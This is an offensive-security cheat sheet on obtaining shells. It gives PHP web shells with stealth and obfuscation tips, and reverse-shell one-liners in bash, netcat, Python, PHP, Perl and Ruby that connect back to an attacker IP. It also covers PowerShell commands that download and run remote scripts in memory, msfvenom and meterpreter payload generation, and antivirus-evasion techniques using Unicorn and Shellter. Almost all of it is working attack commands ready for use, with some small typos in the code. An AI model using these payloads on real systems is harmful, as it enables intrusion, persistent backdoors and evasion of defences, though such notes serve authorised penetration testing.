# General - Shells

### Detect firewall filtering

###### Outgoing traffic blocking

Listen to ICMP traffic on host:

```bash
tcpdump -i <interface> icmp
```

On target, make ICMP "echo" requests using ping in **background** to prevent
shell lose in case of blocked ping:

```bash
ping -c 4 <IP> &
```
```python
python -c 'import os;  os.popen("ping -c 4 <IP> &");"
```

If ICMP packets are received but TCP packets aren't then TCP may be blocked.

### Web Shells

#### PHP

###### Basic  

Basic PHP code to execute system commands through GET parameters:

```php
<?php if($_GET['cmd']) { system($_GET['cmd']); } ?>
<?php if($_GET['cmd']) { exec($_GET['cmd'],$array); print_r($array); } ?>
<?php if($_GET['cmd']) { echo shell_exec($_GET['cmd']); } ?>
<?php if($_GET['cmd']) { echo passsthru($_GET['cmd']); } ?>
<?php if($_GET['cmd']) { preg_replace('/.*/e', $_GET['cmd'], ''); } ?>
```

###### Stealthy  

Instead of passing the commands through the URL, which would appear in logs,
heades parameters can be used:

```php
$_SERVER['HTTP_ACCEPT_LANGUAGE']
$_SERVER['HTTP_USER_AGENT']
```

###### Obfuscation  

The following functions can be used to obfuscate the code.

```php
eval()
assert()
base64()
gzdeflate()
str_rot13()
```

###### phpbash

phpbash is a simple standalone, semi-interactive web shell.  
Upload the phpbash.php or phpbash.min.php file on the target and access it
with any Javascript-enabled web browser to achieve RCE.

https://github.com/Arrexel/phpbash

###### Weevely  

Weevely is a password protected web shell designed for post-exploitation
purposes that can be extended over the network at runtime.

Upload weevely PHP agent to a target web server to get remote shell access to
it. It has more than 30 modules to assist administrative tasks, maintain access,
provide situational awareness, elevate privileges, and spread into the target
network.  
The agent is a small, polymorphic PHP script hardly detected by AV and the
communication protocol is obfuscated within HTTP requests.

```bash
# Generate the backdoor agent
./weevely.py generate mypassword agent.php
Generated backdoor with password 'mypassword' in 'agent.php' of 671 byte size.

# Upload the generated agent under the target web folder.
# Make sure that the agent URL is reachable from your position and that it is correctly executed by the web server as PHP code.

# Connect to the agent
./weevely.py http://<TARGET>/agent.php mypassword
weevely>
```

### Reverse Shells

#### Listener on host

```
# TCP
nc -lvnp <PORT>

# UDP
nc -lvnpu <PORT>

# ICMP
python icmpsh_m.py <HOST_IP> <TARGET_IP>
```

#### One-liners reverse shell

###### Bash

```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done
exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
```

###### Netcat

```
# If nc e option available:
nc -e /bin/sh <IP> <PORT> &
nc.exe -e cmd.exe <IP> <PORT>

# Else (Linux):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

###### Python

```python
# TCP
python -c 'import os;  os.popen("nc -e /bin/sh <IP> <PORT> &");"
python -c 'import os;  os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f &");"
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

###### PHP   

```php
# This code assumes that the TCP connection uses file descriptor 3.
# If it doesn’t work, try 4, 5, 6…
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

###### Perl

```perl
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

###### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### In-memory injection

The scripts needs to be hosted on a webserver, which can be done using
python:

```python
python -m SimpleHTTPServer <PORT>
```

###### Powershell  

The Nishang powershell scripts can be used to get a reverse shell. https://github.com/samratashok/nishang  
The following commands will load directly in memory the powershell script hosted
on the remote webserver:

```powershell
# TCP
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>

# ICMP - Needs a ICMP listener
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress <IP>
```

###### PHP

The pentestmonkeys php-reverse-shell script can be used to leverage a reverse
shell.  
https://github.com/pentestmonkey/php-reverse-shell
The following commands will load directly in memory the script hosted
on the remote webserver and execute it:

```php
curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php
wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php

# Through PHP code injection
# The system call be replaced with various PHP functionalities detailed above.  
system('curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
system('wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
```

#### Binary

###### Compiled one-liner

If reverse shell must be made through a binary the following c code can be used:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
	system("<SHELLCODE_ONELINER");
	return 0;
}
```

The binary must be compiled on the same architecture as the target (advised to
use the same OS and kernel for Linux targets).

To compile for a Windows target on Linux use the cross-compiler mingw:

```
# 32 bits
i686-w64-mingw32-gcc -o test.exe test.c

# 64 bits
x86_64-w64-mingw32-gcc -o test.exe test.c
```

###### msfvenom reverse shell binary

msfvenom can be used to create a reverse shell binary:

```
# 32 bits
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>

# 64 bits
msfvenom -a x64 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
```


#### (Optional) TTY

```
/bin/sh -i
/bin/bash -i
echo os.system('/bin/bash')

# Python
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'

# Perl
perl -e 'exec "/bin/sh";'

# From within IRB
exec "/bin/sh"

# From within vi
:!bash
:set shell=/bin/bash:shell

# With nmap
!sh
```

#### (Optional) Auto-completion and commands history

  - Set host terminal to raw with echo unset:
  `*ctrl-z* stty raw -echo`
  - If TERM environment variable is not set on target shell:
  `*ctrl+z* echo $TERM`
  `*fg* export TERM=<TERM>`

### Meterpreter

Meterpreter is an advanced, dynamically extensible payload that uses in-memory
DLL injection stagers and is extended over the network at runtime.  
It communicates over the stager socket and provides a comprehensive
client-side Ruby API.   
It features command history, tab completion, channels, and more.

#### Handler

When using a meterpreter payload, a handler must be started on the host machine.

The commands to start a metasploit handler are as follows:

```bash
# msfconsole -q

msf> use exploit multi/handler

# Set the payload being executed on the target
msf> set payload windows/x64/meterpreter/reverse_tcp

# Set the local IP and port. In case of a NATED VM with port
# forwarding/redirection, the IP 0.0.0.0 can be used  
msf> set LHOST <HOST_IP>
msf> set LPORT <HOST_PORT>

# To be able to keep several sessions at a time on a single multi/handler
msf> set ExitOnSession false
msf> exploit -j
```

#### PowerShell

######  Invoke-Shellcode

The msfvenom and Invoke-Shellcode tools can be used to leverage a meterpreter
on the target through powershell and in memory execution. This can be used to
bypass AV detection.

The commands to generate a payload, download and execute it on the target are
as follows:

```bash
# x86 target
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<HOST_IP> LPORT=<HOST_PORT> -f powershell -o meterpreter.ps1

# x64 target
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=<HOST_IP> LPORT=<HOST_PORT> -f powershell -o meterpreter.ps1

# Then replace the payload in the Invoke-Shellcode script with the generated payload
# Copy everything from 0xfc to 0xd5 into the $Shellcode32 or $Shellcode64 variables

# Setup a web server hosting the modified Invoke-Shellcode script and a metasploit handler with the according payload
# python -m SimpleHTTPServer <HOST_PORT>
# msf > use multi/handler ...

# Then download in memory and execute the reverse meterpreter
powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;
```

#### Binary

To generate binaries using msfvenom (that will get flagged by most anti-virus):

```
msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <FILE>.exe
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <FILE>.exe
```

The following C code can be used to compile a binary that will escape some
anti-virus:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
	system("powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http:///<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;");
	return 0;
}
```

### Anti-Virus bypass

#### (Windows / PowerShell) Unicorn

Magic Unicorn is a tool for using a PowerShell downgrade attack and inject
shellcode (custom, cobalt or meterpreter) straight into memory.

*Ensure Metasploit is installed if using Metasploit methods.*

If using meterpreter payloads the script will generate two files :
 - powershell_attack.txt
 - unicorn.rc

The text file contains all of the code needed in order to inject the
powershell attack into memory and the rc file can be used to start a metesploit
reverse handler.

The commands are as follow:
```bash
python unicorn.py windows/meterpreter/reverse_http <HOST_IP> <HOST_PORT>

# On host
msfconsole -r unicorn.rc

# On target
# Execute the powershell command contained in the powershell_attack.txt file
```
#### (Windows / binary) Shellter

Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE
infector ever created.  
It can be used in order to inject shellcode into native Windows applications
(currently 32-bit applications only). The shellcode can be self made or
generated within Shellter through a framework, such as Metasploit.

The following builtin shellcodes are currently supported:

```
Meterpreter_Reverse_TCP
Meterpreter_Reverse_HTTP
Meterpreter_Reverse_HTTPS
Meterpreter_Bind_TCP
Shell_Reverse_TCP
Shell_Bind_TCP
WinExec
```

The procedure to create a binary is as follow:

```
$ shellter.exe

Choose Operation Mode - Auto/Manual (A/M/H): A
Perform Online Version Check? (Y/N/H): N

PE Target: <BINARY_TO_INJECT_INTO>

[...]

# Check if the chosen binary match the OS version attacked
Minimum Supported Windows OS: 4.0

# Stealth Mode preserves the original functionality of the infected PE file, so "Stealth" refers to the human factor.
# If you just need a backdoor don't enable this feature.
Enable Stealth Mode? (Y/N/H): N

************
* Payloads *
************
[1] Meterpreter_Reverse_TCP   [stager]
[2] Meterpreter_Reverse_HTTP  [stager]
[3] Meterpreter_Reverse_HTTPS [stager]
[4] Meterpreter_Bind_TCP      [stager]
[5] Shell_Reverse_TCP         [stager]
[6] Shell_Bind_TCP            [stager]
[7] WinExec
# L: One of the above payload
# C: Custom shellcode, a file path must be provided
Use a listed payload or custom? (L/C/H): L
Select payload by index: 1

***************************
* meterpreter_reverse_tcp *
***************************
SET LHOST: <HOSTIP>
SET LPORT: <HOSTPORT>
Payload: meterpreter_reverse_tcp

[...]

Injection: Verified!
Press [Enter] to continue...
```
